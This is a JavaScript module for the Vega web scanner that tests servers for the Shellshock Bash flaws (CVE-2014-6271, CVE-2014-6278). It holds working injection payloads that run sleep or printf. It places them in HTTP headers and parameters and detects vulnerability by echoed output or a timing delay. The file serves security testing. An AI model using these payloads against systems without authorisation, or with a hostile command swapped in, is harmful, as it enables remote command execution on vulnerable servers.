var module = {
	name: "Bash Environment Variable Blind OS Injection (CVE-2014-6271, CVE-2014-6278) Checks",
	category: "Injection Modules",
	differential: true
};

var alteredRequests = [];

var sleepPayload = "() { :;}; /bin/sleep 31"; 
var payload6271 = "() { :; }; printf 'Content-Type: text/json\\r\\n\\r\\n%s vulnerable %s' 'VEGA123' 'VEGA123'";
var payload6278 = "() { _; } >_[\$(\$())] { printf 'Content-Type: text/html\\r\\n\\r\\n%s vulnerable %s' 'VEGA123' 'VEGA123'; }";

alteredRequests.push({
	payload: payload6271,
	header: "EchoAttackFirst",
	check: "echo"
});
alteredRequests.push({
	payload: payload6271,
	header: "",
	check: "echo"
});
alteredRequests.push({
	payload: payload6271,
	header: "Referer",
	check: "echo"
});
alteredRequests.push({
	payload: payload6271,
	header: "Accept-Language",
	check: "echo"
});
alteredRequests.push({
	payload: payload6271,
	header: "Cookie",
	check: "echo"
});

alteredRequests.push({
	payload: payload6278,
	header: "User-Agent",
	check: "echo"
});
alteredRequests.push({
	payload: payload6278,
	header: "",
	check: "echo"
});
alteredRequests.push({
	payload: payload6278,
	header: "Referer",
	check: "echo"
});
alteredRequests.push({
	payload: payload6278,
	header: "Accept-Language",
	check: "echo"
});
alteredRequests.push({
	payload: payload6278,
	header: "Cookie",
	check: "echo"
});


alteredRequests.push({
	payload: sleepPayload,
	header: "",
	check: "timeout"
});
alteredRequests.push({
	payload: sleepPayload,
	header: "User-Agent",
	check: "timeout"
});
alteredRequests.push({
	payload: sleepPayload,
	header: "Referer",
	check: "timeout"
});
alteredRequests.push({
	payload: sleepPayload,
	header: "Accept-Language",
	check: "timeout"
});
alteredRequests.push({
	payload: sleepPayload,
	header: "Cookie",
	check: "timeout"
});

function initialize(ctx) {
	var ps = ctx.getPathState();
		var req = ps.createAlteredRequest("", true);
		req.addHeader("User-Agent","() { :; }; printf 'Content-Type: text/json\\r\\n\\r\\n%s vulnerable %s' 'VEGA123' 'VEGA123'");
		ctx.submitRequest(req, process, 0);
	 
}

var checkTiming = function(ctx, currentIndex) {
	if (ctx.getSavedResponse(currentIndex).milliseconds > 30000) {
		return true;
	}
	return false;
};


var checkOutput = function(ctx, currentIndex) {
	if (ctx.getSavedResponse(currentIndex).bodyAsString.indexOf("VEGA123 vulnerable VEGA123") > -1) {
		return true;
	}
	return false;
};

function process(req, res, ctx) {
	if (ctx.hasModuleFailed()) return;
	if (res.fetchFail) {
		ctx.error(req, res, "During Bash Environment Variable injection checks");
		ctx.setModuleFailed();
		return;
	}
	var ps = ctx.getPathState();
	
	var currentIndex = ctx.getCurrentIndex();
	ctx.addRequestResponse(req, res);
	ctx.incrementResponseCount();
	
	var type="";
	if (alteredRequests[currentIndex].check == "echo"){
		 var detected = checkOutput(ctx, currentIndex); /* check for echod output first */
		 type = detected ? "Executed Commands on Host" : "";
	}
	else{
		 detected = checkTiming(ctx, currentIndex); /* check for timing attack */
		 type = detected ? "Blind Timing Analysis Checks" : "";
	}
	if (detected){
		var uri = String(req.requestLine.uri);                                      
		var uripart = uri.replace(/\?.*/, "");                                      
		if ((uripart.length > 2) && (uripart.slice(-1) == "/")) {
			uripart = uripart.substring(0, uripart.length-1);
		}

		ctx.alert("vinfo-bash-inject", ctx.getSavedRequest(currentIndex), ctx.getSavedResponse(currentIndex), {
			output: res.bodyAsString,                                                 
			key: "vinfo-shell-inject:" + uripart + ":" + ps.getFuzzableParameter().name,
			resource: uripart,                                                        
			detectiontype: type,
			param: ps.getFuzzableParameter().name                                     
		});              
	} else {
		if (currentIndex + 1 < alteredRequests.length) {
			if (alteredRequests[currentIndex + 1].header == "") {
				req = ps.createRequest();
				req = ps.createAlteredRequest(alteredRequests[currentIndex + 1].payload, false);
			} else {
				req = ps.createRequest();
				req.addHeader(alteredRequests[currentIndex + 1].header, alteredRequests[currentIndex + 1].payload);
			}
			ctx.submitRequest(req, process, currentIndex + 1);
			var submitted=currentIndex+1;
		}
	}
	
	if (ctx.allResponsesReceived()) {
		ps.decrementFuzzCounter();
	}
}

